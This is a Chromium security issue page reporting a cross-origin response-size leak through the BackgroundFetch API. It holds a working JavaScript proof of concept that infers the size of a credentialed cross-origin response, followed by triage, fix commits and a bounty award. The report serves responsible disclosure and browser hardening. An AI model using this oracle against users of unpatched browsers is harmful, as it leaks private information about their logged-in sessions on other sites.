# Security: Another Cross-Origin Response Size Leak Via BackgroundFetch

| Field | Value |
|-------|-------|
| **Issue ID** | [40057867](https://issues.chromium.org/issues/40057867) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>BackgroundFetch |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | la...@gmail.com |
| **Assignee** | ra...@chromium.org |
| **Created** | 2021-11-09 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

I found another oracle that makes it possible to leak the response size of cross-origin requests. If the specified value for `downloadTotal` is smaller than the response size, the promise of `BackgroundFetchRecord.responseReady` doesn't resolve. So for example if`BackgroundFetchRegistration.result` is defined, but `BackgroundFetchRecord.responseReady` didn't resolve, the response size is larger than `downloadTotal`.

**VERSION**  

Chrome Version: Version 95.0.4638.69 (Official Build) Arch Linux (64-bit)

**REPRODUCTION CASE**  

I made a page that sends as much characters as specified via the `l` parameter, make sure the glitch.me page (`https://ripe-succinct-root.glitch.me/test?l=10`) is running before testing.

test.html

```
<script>  
  const downloadTotal = 100; // response size to test  
  const url = "https://ripe-succinct-root.glitch.me/test?l=200"; // url to test response size  
  
  navigator.serviceWorker.ready.then(async (swReg) => {  
    const bgFetch = await swReg.backgroundFetch.fetch(  
      "test",  
      [new Request(url, { credentials: "include" })],  
      { downloadTotal: downloadTotal }  
    );  
  
    const targetPage = await bgFetch.match(url);  
    const response = targetPage.responseReady; // promise doesn't return if response size is greater than downloadTotal  
    const noResponse = new Promise(async (r) => {  
      while (!bgFetch.result) {  
        // wait for bgFetch  
        await new Promise((s) => setTimeout(s, 10));  
      }  
      r();  
    });  
  
    const check = await Promise.race([response, noResponse]);  
    console.log(  
      check  
        ? "response size is smaller than or equal to"  
        : "response size is greater than",  
      downloadTotal  
    );  
  });  
  
  navigator.serviceWorker.register("sw.js");  
</script>  

```

sw.js

```
// can be empty  

```

Start a local http server: `python -m http.server`

**CREDIT INFORMATION**  

Maurice Dauer

## Timeline

### [Deleted User] (2021-11-09)

[Empty comment from Monorail migration]

### ts...@chromium.org (2021-11-09)

[Empty comment from Monorail migration]

[Monorail components: Blink>BackgroundFetch]

### ts...@chromium.org (2021-11-10)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-11-23)

Assigning severity medium based on https://crbug.com/chromium/1245053 and this being a cross-origin info leak; goes back to prior to M94 so assigning FoundIn-94 based on oldest current stable channel version (extended stable) 

### [Deleted User] (2021-11-23)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-11-23)

since rayankans@ is currently OOO until 1 December

### [Deleted User] (2021-11-23)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-11-23)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-11-24)

rayankans: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-12-06)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-12-16)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-12-27)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-01-06)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-01-17)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-01-27)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-02-02)

[Empty comment from Monorail migration]

### la...@gmail.com (2022-02-10)

Is there any update on this?

### ra...@chromium.org (2022-02-10)

Sorry for the delay, I was mostly out for the last 3 months, and I just saw this. Not sure why this was assigned to me.

I sent out a fix here: https://chromium-review.googlesource.com/c/chromium/src/+/3452267

### la...@gmail.com (2022-02-10)

No worries, thanks for coming up with a fix that fast. I also reported a few other issues that were assigned to you, not sure if you saw them: https://crbug.com/chromium/1268580, https://crbug.com/chromium/1274547 and https://crbug.com/chromium/1278255.

### gi...@appspot.gserviceaccount.com (2022-02-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/c15a4bba2f9bbc9790ccccaf720bdca1f14ad4e0

commit c15a4bba2f9bbc9790ccccaf720bdca1f14ad4e0
Author: Rayan Kanso <rayankans@google.com>
Date: Mon Feb 14 20:31:53 2022

[Background Fetch] Mark in-progress requests as complete when fetch is aborted

Bug: 1268541
Change-Id: I5752cc5b82a1d6b94d0b0dfe72707da4ca8fb43b
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3452267
Reviewed-by: Peter Beverloo <peter@chromium.org>
Reviewed-by: Avi Drissman <avi@chromium.org>
Commit-Queue: Avi Drissman <avi@chromium.org>
Cr-Commit-Position: refs/heads/main@{#970795}

[modify] https://crrev.com/c15a4bba2f9bbc9790ccccaf720bdca1f14ad4e0/content/browser/background_fetch/background_fetch_delegate_proxy.cc
[modify] https://crrev.com/c15a4bba2f9bbc9790ccccaf720bdca1f14ad4e0/content/browser/background_fetch/background_fetch_delegate_proxy.h
[modify] https://crrev.com/c15a4bba2f9bbc9790ccccaf720bdca1f14ad4e0/components/background_fetch/background_fetch_delegate_base.h
[modify] https://crrev.com/c15a4bba2f9bbc9790ccccaf720bdca1f14ad4e0/components/background_fetch/background_fetch_delegate_base.cc
[modify] https://crrev.com/c15a4bba2f9bbc9790ccccaf720bdca1f14ad4e0/content/public/browser/background_fetch_delegate.h


### la...@gmail.com (2022-03-15)

Hey, is this fixed? Please also see https://crbug.com/chromium/1268541#c19.

### am...@chromium.org (2022-03-28)

Updating as fixed based on CL 

### am...@chromium.org (2022-03-28)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-29)

[Empty comment from Monorail migration]

### am...@google.com (2022-03-29)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-29)

[Empty comment from Monorail migration]

### gm...@google.com (2022-04-04)

[Empty comment from Monorail migration]

### vo...@google.com (2022-04-05)

[Empty comment from Monorail migration]

### vo...@google.com (2022-04-05)

[Empty comment from Monorail migration]

### [Deleted User] (2022-04-05)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### vo...@google.com (2022-04-05)

1. https://crrev.com/c/3568747
2. Low - small changes, no conflicts
3. M100
4. Yes

### gm...@google.com (2022-04-06)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-04-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/bf57ba0673ebe0bce8f65f60bac2c13b4bd167da

commit bf57ba0673ebe0bce8f65f60bac2c13b4bd167da
Author: Rayan Kanso <rayankans@google.com>
Date: Thu Apr 07 16:11:45 2022

[M96-LTS][Background Fetch] Mark in-progress requests as complete when fetch is aborted

(cherry picked from commit c15a4bba2f9bbc9790ccccaf720bdca1f14ad4e0)

Bug: 1268541
Change-Id: I5752cc5b82a1d6b94d0b0dfe72707da4ca8fb43b
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3452267
Commit-Queue: Avi Drissman <avi@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#970795}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3568747
Reviewed-by: Simon Hangl <simonha@google.com>
Owners-Override: Simon Hangl <simonha@google.com>
Commit-Queue: Zakhar Voit <voit@google.com>
Cr-Commit-Position: refs/branch-heads/4664@{#1576}
Cr-Branched-From: 24dc4ee75e01a29d390d43c9c264372a169273a7-refs/heads/main@{#929512}

[modify] https://crrev.com/bf57ba0673ebe0bce8f65f60bac2c13b4bd167da/content/browser/background_fetch/background_fetch_delegate_proxy.cc
[modify] https://crrev.com/bf57ba0673ebe0bce8f65f60bac2c13b4bd167da/content/browser/background_fetch/background_fetch_delegate_proxy.h
[modify] https://crrev.com/bf57ba0673ebe0bce8f65f60bac2c13b4bd167da/components/background_fetch/background_fetch_delegate_base.h
[modify] https://crrev.com/bf57ba0673ebe0bce8f65f60bac2c13b4bd167da/components/background_fetch/background_fetch_delegate_base.cc
[modify] https://crrev.com/bf57ba0673ebe0bce8f65f60bac2c13b4bd167da/content/public/browser/background_fetch_delegate.h


### vo...@google.com (2022-04-08)

[Empty comment from Monorail migration]

### am...@google.com (2022-04-11)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-04-11)

Congratulations! The VRP Panel has decided to award you $3,000 for this report. Thank you for your efforts and reporting this issue to us! 

### vo...@google.com (2022-04-12)

[Empty comment from Monorail migration]

### am...@google.com (2022-04-13)

[Empty comment from Monorail migration]

### [Deleted User] (2022-07-05)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@google.com (2022-07-22)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-07-29)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1268541?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40057867)*
